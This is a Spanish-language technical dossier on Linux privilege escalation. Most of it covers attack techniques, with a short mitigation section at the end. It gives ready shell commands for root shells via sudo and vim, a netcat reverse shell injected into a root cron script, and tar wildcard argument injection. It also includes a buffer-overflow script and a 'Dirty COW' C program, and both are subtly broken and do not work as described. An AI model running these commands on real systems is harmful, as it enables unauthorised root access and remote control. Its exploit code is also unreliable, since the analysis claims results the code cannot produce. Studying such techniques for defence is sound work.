## Introducción

La escalada de privilegios en sistemas Linux es un proceso crítico en el contexto de la seguridad informática. Implica la capacidad de un usuario con permisos limitados de obtener un nivel superior de acceso, típicamente el acceso "root" o de administrador. Este dossier técnico detalla los vectores de ataque más comunes, las técnicas de mitigación y los pasos para realizar una auditoría exhaustiva de un sistema Linux en busca de posibles vulnerabilidades de escalada de privilegios.

## 1. Fases de Reconocimiento y Enumeración

La fase inicial de cualquier intento de escalada de privilegios implica una recolección exhaustiva de información sobre el sistema objetivo. Este proceso incluye la identificación de la versión del kernel, el sistema operativo, los usuarios, los grupos, la configuración de red y cualquier servicio que se esté ejecutando. Esta información es fundamental para identificar posibles vulnerabilidades y vectores de ataque.

### 1.1. Identificación del Kernel y del Sistema Operativo

El primer paso es identificar la versión del kernel y del sistema operativo. Esto se puede lograr utilizando los siguientes comandos:

- `uname -a`: Muestra información detallada sobre el kernel, incluyendo la versión, la arquitectura y la fecha de compilación.

  ```bash
  uname -a
  # Ejemplo de salida: Linux ubuntu 5.15.0-76-generic [[83-Ubuntu]] SMP Thu Jun 15 19:16:33 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
  ```

  **Análisis:** La salida del comando `uname -a` proporciona información valiosa sobre el kernel del sistema. La versión del kernel es crucial porque permite identificar posibles vulnerabilidades conocidas que podrían ser explotadas. Por ejemplo, si la versión del kernel es vulnerable a Dirty COW (CVE-2016-5195), se puede intentar explotar esta vulnerabilidad para obtener acceso root.

- `cat /etc/os-release`: Muestra información sobre la distribución de Linux y la versión del sistema operativo.

  ```bash
  cat /etc/os-release
  # Ejemplo de salida:
  # NAME="Ubuntu"
  # VERSION="22.04.2 LTS (Jammy Jellyfish)"
  # ID=ubuntu
  # ID_LIKE=debian
  # PRETTY_NAME="Ubuntu 22.04.2 LTS"
  # VERSION_ID="22.04"
  # HOME_URL="https://www.ubuntu.com/"
  # SUPPORT_URL="https://help.ubuntu.com/"
  # BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
  # PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
  ```

  **Análisis:** El archivo `/etc/os-release` proporciona información detallada sobre la distribución de Linux y su versión. Esta información es útil para determinar qué tipo de exploits y vulnerabilidades podrían ser aplicables al sistema. Por ejemplo, algunas distribuciones de Linux pueden tener parches de seguridad específicos que aborden ciertas vulnerabilidades.

### 1.2. Enumeración de Usuarios y Grupos

Es fundamental identificar los usuarios y grupos del sistema. Esto se puede lograr utilizando los siguientes comandos:

- `id`: Muestra información sobre el usuario actual, incluyendo el ID de usuario (UID), el ID de grupo (GID) y los grupos a los que pertenece el usuario.

  ```bash
  id
  # Ejemplo de salida: uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),136(sambashare)
  ```

  **Análisis:** El comando `id` revela información importante sobre el usuario actual, incluyendo sus privilegios y membresías de grupo. Esta información puede ser útil para identificar posibles vectores de ataque basados en los permisos y capacidades del usuario. Por ejemplo, si el usuario pertenece al grupo `sudo`, podría ser posible abusar de los derechos de sudo para escalar privilegios.

- `cat /etc/passwd`: Muestra información sobre todos los usuarios del sistema.

  ```bash
  cat /etc/passwd
  # Ejemplo de salida (extracto):
  # root:x:0:0:root:/root:/bin/bash
  # daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  # user:x:1000:1000:User,,,:/home/user:/bin/bash
  ```

  **Análisis:** El archivo `/etc/passwd` contiene información sobre todos los usuarios del sistema, incluyendo sus nombres de usuario, UIDs, GIDs, directorios de inicio y shells de inicio de sesión. Esta información es útil para identificar posibles objetivos para ataques de escalada de privilegios. Por ejemplo, si se encuentra un usuario con un shell de inicio de sesión inusual, podría ser vulnerable a un ataque de inyección de comandos.

- `cat /etc/group`: Muestra información sobre todos los grupos del sistema.

  ```bash
  cat /etc/group
  # Ejemplo de salida (extracto):
  # root:x:0:
  # adm:x:4:syslog,user
  # sudo:x:27:user
  ```

  **Análisis:** El archivo `/etc/group` contiene información sobre todos los grupos del sistema, incluyendo sus nombres, GIDs y los miembros del grupo. Esta información es útil para identificar posibles vectores de ataque basados en los permisos de grupo. Por ejemplo, si un grupo tiene acceso a un archivo o directorio importante, podría ser posible escalar privilegios explotando los permisos de grupo.

### 1.3. Enumeración de la Configuración de Red

Es importante identificar la configuración de red del sistema para identificar posibles servicios internos que se ejecuten con privilegios elevados. Esto se puede lograr utilizando los siguientes comandos:

- `ip a`: Muestra información sobre las interfaces de red del sistema, incluyendo las direcciones IP, las máscaras de red y los estados de las interfaces.

  ```bash
  ip a
  # Ejemplo de salida (extracto):
  # 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
  #     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
  #     inet 127.0.0.1/8 scope host lo
  #        valid_lft forever preferred_lft forever
  # 2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
  #     link/ether 00:11:22:33:44:55 brd ff:ff:ff:ff:ff:ff
  #     inet 192.168.1.100/24 brd 192.168.1.255 scope global dynamic eth0
  #        valid_lft 86391sec preferred_lft 86391sec
  ```

  **Análisis:** El comando `ip a` revela información sobre las interfaces de red del sistema, incluyendo las direcciones IP asignadas. Esta información es útil para identificar posibles servicios internos que se ejecuten con privilegios elevados. Por ejemplo, si se encuentra un servicio que se ejecuta en una dirección IP local (127.0.0.1), podría ser vulnerable a un ataque de escalada de privilegios si se puede acceder a ese servicio desde el exterior.

- `netstat -antup`: Muestra información sobre las conexiones de red activas y los puertos de escucha del sistema.

  ```bash
  netstat -antup
  # Ejemplo de salida (extracto):
  # tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1000/sshd
  # tcp        0      0 127.0.0.1:6379            0.0.0.0:*               LISTEN      1234/redis-server
  ```

  **Análisis:** El comando `netstat -antup` revela información sobre las conexiones de red activas y los puertos de escucha del sistema, junto con los procesos que están escuchando en esos puertos. Esta información es útil para identificar posibles servicios internos que se ejecuten con privilegios elevados. Por ejemplo, si se encuentra un servicio que se ejecuta como root y escucha en un puerto accesible desde el exterior, podría ser vulnerable a un ataque de escalada de privilegios.

### 1.4. Herramientas de Automatización (LinPEAS)

Herramientas como LinPEAS (Linux Privilege Escalation Awesome Script) automatizan el proceso de enumeración, facilitando la identificación de posibles vectores de escalada. LinPEAS examina versiones de aplicaciones con privilegios elevados, parches del sistema y vulnerabilidades del kernel.

```bash
# Ejemplo de uso de LinPEAS
./linpeas.sh
```

LinPEAS realiza una serie de comprobaciones automatizadas, buscando configuraciones inseguras, archivos SUID/SGID, vulnerabilidades del kernel y otras posibles vías de escalada de privilegios. La salida de LinPEAS es extensa y requiere un análisis cuidadoso para identificar las vulnerabilidades más críticas.

## 2. Vectores de Ataque Comunes

Una vez que se ha recopilado suficiente información sobre el sistema objetivo, se pueden explorar diferentes vectores de ataque para intentar escalar privilegios. Los vectores de ataque más comunes incluyen el abuso de sudo, la explotación de binarios SUID/SGID, el abuso de tareas programadas (cron jobs), la explotación de vulnerabilidades del kernel y el abuso de archivos y permisos.

### 2.1. Abuso de Sudo

El comando `sudo` permite a los usuarios ejecutar comandos con los privilegios de otro usuario, típicamente el usuario root. Si un usuario tiene permisos de sudo configurados incorrectamente, podría ser posible abusar de estos permisos para escalar privilegios.

#### 2.1.1. Verificación de Derechos de Sudo

El primer paso es verificar qué comandos se pueden ejecutar con sudo. Esto se puede lograr utilizando el siguiente comando:

```bash
sudo -l
```

La salida de este comando muestra una lista de los comandos que el usuario actual puede ejecutar con sudo, junto con cualquier restricción o requisito de contraseña.

```
User user may run the following commands on this host:
    (ALL : ALL) ALL
    (root) /usr/bin/vim
```

**Análisis:** En este ejemplo, el usuario `user` puede ejecutar cualquier comando como cualquier usuario (`(ALL : ALL) ALL`), lo cual es extremadamente peligroso, o ejecutar el comando `/usr/bin/vim` como el usuario root. Si el usuario puede ejecutar cualquier comando como cualquier usuario, puede escalar privilegios ejecutando un shell como root:

```bash
sudo /bin/bash
```

O si solo puede ejecutar `vim` como root:

```bash
sudo vim -c ':!/bin/sh'
```

#### 2.1.2. GTFOBins

GTFOBins es una colección de binarios de Linux que se pueden utilizar para realizar una variedad de tareas, incluyendo la escalada de privilegios. Si un usuario puede ejecutar un binario incluido en GTFOBins con sudo, podría ser posible utilizar ese binario para escalar privilegios.

Por ejemplo, si el usuario puede ejecutar el binario `vim` con sudo, puede utilizar el siguiente comando para obtener una shell como root:

```bash
sudo vim -c ':!/bin/sh'
```

**Análisis:** Este comando ejecuta el editor de texto `vim` con sudo y luego utiliza el comando `:!/bin/sh` dentro de `vim` para ejecutar un shell como root.

### 2.2. Binarios SUID/SGID

Los binarios SUID (Set User ID) y SGID (Set Group ID) son archivos ejecutables que se ejecutan con los permisos del propietario del archivo (en el caso de SUID) o del grupo del archivo (en el caso de SGID), en lugar de los permisos del usuario que ejecuta el archivo. Si un binario SUID/SGID tiene una vulnerabilidad o permite la ejecución de comandos arbitrarios, podría ser posible explotar esa vulnerabilidad para escalar privilegios.

#### 2.2.1. Búsqueda de Binarios SUID/SGID

El primer paso es buscar binarios SUID/SGID en el sistema. Esto se puede lograr utilizando el siguiente comando:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Este comando busca todos los archivos que tienen el bit SUID establecido y muestra sus nombres de ruta.

```
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
```

#### 2.2.2. Explotación de Binarios SUID/SGID

Una vez que se han identificado los binarios SUID/SGID, se deben analizar para identificar posibles vulnerabilidades. Algunas vulnerabilidades comunes en binarios SUID/SGID incluyen:

- **Buffer Overflow:** Si un binario SUID/SGID es vulnerable a un buffer overflow, podría ser posible inyectar código malicioso en la memoria del proceso y ejecutar ese código con los privilegios del propietario del archivo.
- **Inyección de Comandos:** Si un binario SUID/SGID permite la ejecución de comandos arbitrarios, podría ser posible inyectar comandos maliciosos y ejecutarlos con los privilegios del propietario del archivo.
- **Escritura Arbitraria de Archivos:** Si un binario SUID/SGID permite la escritura arbitraria de archivos, podría ser posible sobrescribir archivos críticos del sistema y escalar privilegios.

**Ejemplo:** Supongamos que se encuentra un binario SUID llamado `vuln_app` que es vulnerable a un buffer overflow. Se podría explotar esta vulnerabilidad utilizando un exploit como el siguiente:

```python
#!/usr/bin/env python3
import struct

# Dirección de retorno a la que queremos saltar (ejemplo: /bin/sh)
return_address = struct.pack("<I", 0x08048400) # Reemplazar con la dirección correcta

# Relleno para alcanzar la dirección de retorno
padding = b"A" * 100

# Carga útil (payload)
payload = padding + return_address

# Ejecutar la aplicación vulnerable con la carga útil
import os
os.system("./vuln_app " + payload.decode())
```

**Análisis:** Este script de Python construye una carga útil que contiene un relleno y una dirección de retorno. La dirección de retorno apunta a una ubicación de memoria donde se encuentra el código para ejecutar un shell. Cuando la aplicación vulnerable ejecuta el código con la carga útil, el buffer overflow sobrescribe la dirección de retorno con la dirección proporcionada en la carga útil, lo que hace que el programa salte a la dirección del shell, ejecutando un shell con privilegios elevados.

### 2.3. Tareas Programadas (Cron Jobs)

Las tareas programadas (cron jobs) son scripts o comandos que se ejecutan automáticamente en un horario predefinido. Si un script ejecutado por cron tiene permisos débiles o utiliza patrones inseguros, podría ser posible abusar de estos scripts para escalar privilegios.

#### 2.3.1. Revisión de Archivos Cron

Los archivos cron se encuentran típicamente en los siguientes lugares:

- `/etc/crontab`: Archivo principal de configuración de cron.
- `/etc/cron.d/`: Directorio que contiene archivos de configuración de cron adicionales.
- `/var/spool/cron/`: Directorio que contiene archivos de configuración de cron para usuarios individuales.

El primer paso es revisar estos archivos para identificar posibles vulnerabilidades.

```bash
cat /etc/crontab
cat /etc/cron.d/*
```

**Ejemplo de `/etc/crontab`:**

```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root /path/to/script.sh
```

#### 2.3.2. Permisos Débiles

Si un script ejecutado por cron tiene permisos débiles, podría ser posible modificar el script y inyectar código malicioso. Por ejemplo, si el script `/path/to/script.sh` tiene permisos de escritura para el usuario actual, se podría inyectar una reverse shell en el script:

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PUERTO> >/tmp/f' >> /path/to/script.sh
```

**Análisis:** Este comando inyecta una reverse shell en el script `/path/to/script.sh`. Cuando el script se ejecute por cron, la reverse shell se conectará a la dirección IP y el puerto especificados, proporcionando una shell como el usuario que ejecuta el cron job (típicamente root).

#### 2.3.3. Wildcards Inseguros

Si un script ejecutado por cron utiliza wildcards de forma insegura, podría ser posible inyectar argumentos maliciosos. Por ejemplo, si el script utiliza `tar *` para crear un archivo, se podría inyectar argumentos maliciosos creando archivos con nombres como `--checkpoint-action=exec=sh`:

```bash
touch "--checkpoint-action=exec=sh"
touch --checkpoint=1
```

**Análisis:** Estos comandos crean dos archivos con nombres que contienen argumentos maliciosos para el comando `tar`. Cuando el script se ejecute por cron y ejecute el comando `tar *`, el comando `tar` interpretará los nombres de los archivos como argumentos y ejecutará el comando `sh`, proporcionando una shell como el usuario que ejecuta el cron job (típicamente root).

### 2.4. Explotación de Vulnerabilidades del Kernel

Si todas las demás opciones fallan, se puede intentar explotar vulnerabilidades conocidas del kernel. Esto es generalmente el último recurso, ya que puede ser arriesgado y puede crashear el sistema.

#### 2.4.1. Búsqueda de Exploits

El primer paso es buscar exploits conocidos para la versión del kernel que se está ejecutando. Se pueden utilizar bases de datos de vulnerabilidades como Exploit-DB o CVE Details para buscar exploits.

**Ejemplos de Vulnerabilidades del Kernel:**

- **Dirty COW (CVE-2016-5195):** Una condición de carrera en la gestión de memoria copy-on-write que permite a un usuario local escalar privilegios.
- **PwnKit (CVE-2021-4034):** Una vulnerabilidad en `pkexec` que permite a un usuario local escalar privilegios.

#### 2.4.2. Ejecución de Exploits

Una vez que se ha encontrado un exploit, se debe descargar y compilar el exploit. Luego, se puede ejecutar el exploit para intentar escalar privilegios.

**Ejemplo: Explotación de Dirty COW**

```c
[[include]] <stdio.h>
[[include]] <stdlib.h>
[[include]] <string.h>
[[include]] <unistd.h>
[[include]] <fcntl.h>
[[include]] <pthread.h>
[[include]] <sys/mman.h>
[[include]] <sys/stat.h>

// Créditos: https://github.com/dirtycow/dirtycow.github.io

const char *file_path = "/tmp/cow_file";
const char *payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

void *map;
int file_descriptor;

void *madviseThread(void *arg) {
    while (1) {
        madvise(map, 100, MADV_DONTNEED);
    }
    return NULL;
}

void *overwriteThread(void *arg) {
    int i, c = 0;
    while (1) {
        for (i = 0; i < strlen(payload); i++) {
            map[i] = payload[i];
            c++;
        }
    }
    return NULL;
}

int main(void) {
    pthread_t p1, p2;
    long file_size;
    int i;

    // Crear archivo
    file_descriptor = open(file_path, O_RDWR | O_CREAT, 0777);
    write(file_descriptor, "Inicial", 7);

    // Obtener el tamaño del archivo
    struct stat st;
    fstat(file_descriptor, &st);
    file_size = st.st_size;

    // Mapear el archivo en memoria
    map = mmap(NULL, file_size, PROT_READ | PROT_WRITE, MAP_SHARED, file_descriptor, 0);

    // Crear hilos
    pthread_create(&p1, NULL, madviseThread, NULL);
    pthread_create(&p2, NULL, overwriteThread, NULL);

    // Esperar un tiempo (opcional)
    sleep(10);

    return 0;
}
```

**Análisis:** Este código C explota la vulnerabilidad Dirty COW. Primero crea un archivo, lo mapea en memoria y luego crea dos hilos. Un hilo utiliza `madvise` para liberar páginas de memoria, mientras que el otro hilo intenta sobrescribir el archivo en memoria. Debido a la condición de carrera en el kernel, el hilo que sobrescribe puede tener éxito, permitiendo la escritura en un archivo que de otro modo sería de solo lectura.

### 2.5. Abuso de Archivos y Permisos

Los archivos y permisos incorrectamente configurados pueden proporcionar oportunidades para escalar privilegios.

#### 2.5.1. Capabilities

Las capabilities son un sistema de permisos más granular que SUID/SGID. En lugar de otorgar todos los privilegios de root, las capabilities permiten otorgar privilegios específicos a un programa.

Para listar las capabilities de los archivos en el sistema, se puede utilizar el siguiente comando:

```bash
getcap -r / 2>/dev/null
```

**Ejemplo de Salida:**

```
/usr/bin/ping = cap_net_raw+ep
```

**Análisis:** En este ejemplo, el binario `ping` tiene la capability `cap_net_raw+ep`, que le permite enviar paquetes ICMP sin necesidad de privilegios de root. Si se encuentra un binario con una capability que pueda ser abusada, podría ser posible escalar privilegios.

#### 2.5.2. NFS Root Squashing

El NFS (Network File System) es un protocolo que permite compartir archivos a través de una red. Si la opción `no_root_squash` está habilitada en la configuración de NFS, un usuario root en un sistema cliente puede acceder a los archivos compartidos en el sistema servidor con privilegios de root. Esto puede ser peligroso si el sistema cliente está comprometido, ya que un atacante podría utilizar el sistema cliente para escalar privilegios en el sistema servidor.

Para verificar si la opción `no_root_squash` está habilitada, se puede revisar el archivo `/etc/exports` en el sistema servidor.

**Ejemplo de `/etc/exports`:**

```
/path/to/shared/folder client_ip(rw,no_root_squash)
```

**Análisis:** En este ejemplo, la opción `no_root_squash` está habilitada para el sistema cliente con la dirección IP `client_ip`.

#### 2.5.3. Claves SSH

Las claves SSH se utilizan para autenticar usuarios en un sistema remoto. Si se encuentra una clave SSH privada que pertenece a un usuario con privilegios elevados (como root), se podría utilizar esa clave para iniciar sesión en el sistema remoto y escalar privilegios.

Las claves SSH se encuentran típicamente en los siguientes lugares:

- `/home/*/.ssh/id_rsa`: Clave privada por defecto del usuario
- `/root/.ssh/id_rsa`: Clave privada del usuario root
- `/backups/`: En copias de seguridad de archivos

## 3. Técnicas de Mitigación

Para mitigar los riesgos de escalada de privilegios, se deben implementar una serie de medidas de seguridad.

### 3.1. Principio de Privilegio Mínimo

El principio de privilegio mínimo establece que cada usuario y proceso debe tener solo los privilegios necesarios para realizar su tarea. Esto reduce la superficie de ataque y dificulta la escalada de privilegios.

### 3.2. Auditoría Regular de Permisos

Se deben realizar auditorías regulares de los permisos de archivos y directorios para identificar posibles configuraciones incorrectas. Se deben revisar los binarios SUID/SGID, las tareas programadas y las capabilities para garantizar que no estén configurados de forma insegura.

### 3.3. Actualizaciones de Seguridad

Es fundamental mantener el sistema operativo y el software actualizado con las últimas actualizaciones de seguridad. Las actualizaciones de seguridad suelen incluir parches para vulnerabilidades conocidas que podrían ser explotadas para escalar privilegios.

### 3.4. Configuración Segura de Sudo

La configuración de sudo debe ser revisada cuidadosamente para garantizar que los usuarios solo tengan los privilegios necesarios. Se deben evitar las configuraciones que permitan a los usuarios ejecutar cualquier comando como cualquier usuario.

### 3.5. Monitoreo de Seguridad

Se deben implementar sistemas de monitoreo de seguridad para detectar posibles intentos de escalada de privilegios. Se deben monitorear los registros del sistema en busca de eventos sospechosos, como el uso de comandos inusuales o la modificación de archivos críticos del sistema.

## 4. Conclusión

La escalada de privilegios en sistemas Linux es una amenaza seria que puede permitir a un atacante obtener control total sobre un sistema. Para mitigar los riesgos de escalada de privilegios, se deben implementar una serie de medidas de seguridad, incluyendo el principio de privilegio mínimo, la auditoría regular de permisos, las actualizaciones de seguridad, la configuración segura de sudo y el monitoreo de seguridad. La comprensión de los vectores de ataque comunes y las técnicas de mitigación es fundamental para proteger los sistemas Linux de ataques de escalada de privilegios.
